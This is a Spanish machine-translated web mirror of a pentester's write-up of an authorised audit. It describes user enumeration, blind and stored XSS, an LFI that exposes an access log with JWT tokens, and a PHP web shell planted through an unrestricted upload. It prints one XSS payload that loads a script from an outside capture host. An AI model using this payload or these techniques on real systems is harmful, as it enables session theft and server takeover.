<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üë¶üèº üå®Ô∏è üßìüèº De un usuario normal a un administrador de servidor completo (XSS, LFI, Web-Shell) ü§µüèΩ üëÉüèø „ÄΩÔ∏è</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="A principios de a√±o, un empleado de una empresa me escribi√≥. Seg√∫n tengo entendido, hubo un peque√±o conflicto en la empresa. Debido a que exist√≠a el r...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>De un usuario normal a un administrador de servidor completo (XSS, LFI, Web-Shell)</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/452854/"><img src="https://habrastorage.org/webt/pc/sr/se/pcsrseauno875cmhmbms8odj33e.jpeg"><br><br>  A principios de a√±o, un empleado de una empresa me escribi√≥.  Seg√∫n tengo entendido, hubo un peque√±o conflicto en la empresa.  Debido a que exist√≠a el riesgo de un compromiso del sistema por parte de algunos de los empleados.  La decisi√≥n de auditar el sistema fue definitivamente la correcta.  Despu√©s de todo, los resultados de la inspecci√≥n me sorprendieron gratamente, y "desagradablemente" sorprendieron al cliente. <br><a name="habracut"></a><br>  La arquitectura del sistema era, en principio, est√°ndar.  Se bas√≥ en un servicio de autenticaci√≥n.  Adem√°s, seg√∫n el token emitido por jwt, el usuario podr√≠a usar la funcionalidad del sistema en varios subdominios. <br><br>  Las pruebas se limitaron a un subdominio.  Pero lo m√°s b√°sico seg√∫n los clientes.  No contar√© en detalle todos los errores y problemas.  Fueron descubiertos mucho.  Solo describir√© los que me parecieron m√°s curiosos. <br><br><h2>  Redundancia de informaci√≥n al buscar usuarios </h2><br>  La consulta de b√∫squeda para usuarios permiti√≥ recibir un conjunto de informaci√≥n de la siguiente naturaleza: ID de usuario, nombre, inicio de sesi√≥n, avatar ... <br><img src="https://habrastorage.org/webt/tg/qu/ov/tgquov-poitm1ptfpu0zbeluz80.png"><br>  Sin ning√∫n problema, fue posible recopilar toda la base de datos de usuarios de Login_name.  Tampoco hubo restricciones especiales en la funcionalidad de inicio de sesi√≥n.  Luego fue posible seleccionar una contrase√±a en varias transmisiones o realizar phishing en los usuarios m√°s importantes del sistema. <br><br><h2>  Blind XSS al solicitar soporte al usuario. </h2><br>  Tengo la impresi√≥n de que este problema est√° presente en el 90% de los sistemas que encuentro.  Anteriormente, los "imb√©ciles" de las plataformas para agregar comentarios me han llegado repetidamente.  Tambi√©n ingresaron los accesos a los sistemas de monitoreo del comportamiento del usuario en Internet.  Hab√≠a muchas cosas  Sin embargo, pocas personas entienden cu√°n peligroso puede ser esto.  Espec√≠ficamente, esta vulnerabilidad se escribi√≥ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">aqu√≠</a> . <br>  En este caso, me asegur√© de que el ataque funcionara por accidente cuando recib√≠ una notificaci√≥n de <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">XSS Hunter</a> .  El vector de ataque fue el siguiente: <br><br><pre><code class="javascript hljs"><span class="hljs-string"><span class="hljs-string">"&gt;&lt;script src=https://sa.xss.ht&gt;&lt;/script&gt;</span></span></code> </pre> <br>  Pero el cliente no cre√≠a que pudiera obtener el control del panel de administraci√≥n a trav√©s de este vector de ataque.  Despu√©s de todo, toda la informaci√≥n valiosa se almacena en el almacenamiento local.  Dado que XSS Hunter no admite la recepci√≥n de informaci√≥n de almacenamiento local, tuve que implementar mi propio registrador XSS.  La siguiente <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">publicaci√≥n fue</a> muy √∫til.  Como resultado del ataque repetido, fue posible verificar que el token jwt del administrador se pueda obtener f√°cilmente por medios maliciosos incluso desde el almacenamiento local. <br><img src="https://habrastorage.org/webt/ju/o_/gg/juo_ggzcuntv-w0xpqj8wyrc81s.png"><br><br>  Bueno, entonces con los derechos de administrador en el sistema, puede hacer cualquier cosa. <br><br><h2>  XSS almacenado en un correo electr√≥nico. </h2><br>  Se descubri√≥ una funcionalidad en el sistema que le permite crear invitaciones de correo electr√≥nico enmarcadas para registrar nuevos usuarios.  Puede insertar el nombre de la persona en el formulario de carta.  Para hacer que el correo electr√≥nico sea m√°s personal.  Como resultado, todo el contenido no se escap√≥ y cay√≥ en la carta.  Para llevar a cabo un ataque xss exitoso similar a trav√©s de una carta, debe conocer el cliente de correo electr√≥nico de la v√≠ctima, y ‚Äã‚Äãdebe saber el d√≠a cero xss para este cliente.  En general, el √©xito de este ataque, por definici√≥n, fue insignificante.  Hasta el momento en que encontr√© un curioso bot√≥n en la esquina superior de la carta. <br><br><img src="https://habrastorage.org/webt/_9/bc/aw/_9bcawpodb6qbagj8om9k7d0nhc.png"><br><br>  Fue una oportunidad para abrir una versi√≥n web de la carta.  Y aqu√≠ me esperaba una sorpresa.  Mi XSS funcion√≥.  Al mismo tiempo, la versi√≥n web de la carta se abri√≥ en el subdominio admin. *. Com <br><br><img src="https://habrastorage.org/webt/rk/nt/gt/rkntgtsisw3mf4oef6dfzc31tbq.png"><br><br>  Doble sorpresa, por as√≠ decirlo. <br><br><h2>  Archivo disponible access.log </h2><br>  En el proceso de auditor√≠a, encontr√© un lugar interesante.  Cuando diferentes caracteres ingresaron a la solicitud, el servidor 404 recibi√≥ una respuesta del servidor, pero peri√≥dicamente, la respuesta 404 era ligeramente diferente de la anterior.  A veces hab√≠a un encabezado extra.  A veces no.  Una cierta mutaci√≥n en las respuestas del sistema me llev√≥ a verificar la inclusi√≥n de archivos locales ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">LFI</a> ) en este lugar.  Configur√© el diccionario lfi y esper√© a que el sistema respondiera a todas mis solicitudes.  Como resultado, al ver los resultados de la prueba, me sorprendi√≥ mucho la respuesta con un estado de 200 con un tama√±o muy pesado de los datos transmitidos. <br><br><img src="https://habrastorage.org/webt/kl/vc/cw/klvccwx_esjpgpgzbian0kyxd4c.png"><br><br>  Result√≥ que encontr√© un archivo legible access.log.  Este archivo registr√≥ toda la actividad en el servidor.  Incluyendo en este archivo fue posible detectar tokens de usuario jwt. <br><img src="https://habrastorage.org/webt/ld/wy/rs/ldwyrs3tnisd5_jm4sbmcx2dmom.png"><br><br>  El tiempo de caducidad de estos tokens fue bastante grande.  Y eso tampoco fue muy bueno. <br><br><h2>  Acceso completo al servidor web </h2><br>  En principio, todo lo anterior son problemas comunes.  Pero ciertos tipos de vulnerabilidades ya son dif√≠ciles de cumplir.  Se trata de acceder al servidor a trav√©s de un c√≥digo perfectamente cargado en el archivo shell.php.  Despu√©s de lo cual todos los proyectos ubicados en este servidor se ven comprometidos.  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=" class="user_link">Bo0oM</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">escribi√≥</a> sobre este tema en 2016 en su blog. <br>  Pero volviendo a mi ejemplo.  El sistema ten√≠a la capacidad de hacer publicaciones.  Al mismo tiempo, fue posible subir una imagen para su publicaci√≥n.  La imagen se guard√≥ en el mismo dominio.  Pero el nombre del archivo fue cambiado a la fuerza.  Es decir, usted carga - mypicture.jpg.  Pero como resultado, obtienes 12345.jpg.  Decid√≠ verificar qu√© pasar√≠a si transfiero el archivo xml (en ese momento aparentemente so√±aba con conocer a XXE).  Y para mi sorpresa, recib√≠ la respuesta 123556.xml.  Y luego me di cuenta de que hay un 99% de posibilidades de √©xito con la extensi√≥n de archivo php para el shell web.  Para este ataque, utilic√© el <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">shell b374k</a> .  Con acceso directo al archivo, obtuve lo que quer√≠a.  Acceso a directorios del servidor. <br><br><img src="https://habrastorage.org/webt/bt/ik/lf/btiklfakt0wb2gyiwahanzp6k1k.png"><br><br>  Pero eso no fue lo m√°s triste.  Lo m√°s triste fue que a trav√©s de esta vulnerabilidad fue posible comprometer m√°s de 10 proyectos que estaban en el directorio ra√≠z de este servidor. <br><br><img src="https://habrastorage.org/webt/o6/tw/cw/o6twcw5jb6vfazbvbhn3lzqivdg.png"><br><br>  Mi amigo <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=" class="user_link">cyberpunkyc</a> dijo que esto se pod√≠a ver en el a√±o 2007-2010.  Por desgracia, en el patio de 2019. Existe un problema similar hasta el d√≠a de hoy. <br><br>  Como resultado de las pruebas, el cliente qued√≥ muy sorprendido por los resultados.  Y estaba muy contento de haber sido muy √∫til en las pruebas.  Si tiene alguna sugerencia con proyectos interesantes, no dude en escribirme en <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">telegrama</a> ;) </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/452854/">https://habr.com/ru/post/452854/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../452844/index.html">Transformaci√≥n o blasfemias: c√≥mo "digitalizar" los operadores de telecomunicaciones</a></li>
<li><a href="../452846/index.html">C√≥mo construimos un cl√∫ster confiable de PostgreSQL en Patroni</a></li>
<li><a href="../452848/index.html">¬øQu√© va a pasar el 1 de febrero de 2020?</a></li>
<li><a href="../452850/index.html">Sistemas dentro de cartuchos: c√≥mo los ingenieros ampliaron las capacidades de las consolas de juegos</a></li>
<li><a href="../452852/index.html">Trabajo remoto: mitos de noche</a></li>
<li><a href="../452856/index.html">¬øPor qu√© los proyectos independientes no viven para lanzar?</a></li>
<li><a href="../452872/index.html">Como no me prepar√© y celebr√© un seminario de Rosnanov sobre FPGA en Mosc√∫. Planea hacer lo mismo en Las Vegas y Zelenograd</a></li>
<li><a href="../452876/index.html">UICollectionViewLayout para pizza de diferentes mitades</a></li>
<li><a href="../452880/index.html">Fugas de datos de usuarios sensacionales para enero - abril de 2019</a></li>
<li><a href="../452882/index.html">Errores del cliente en el primer contacto con Freelancer</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>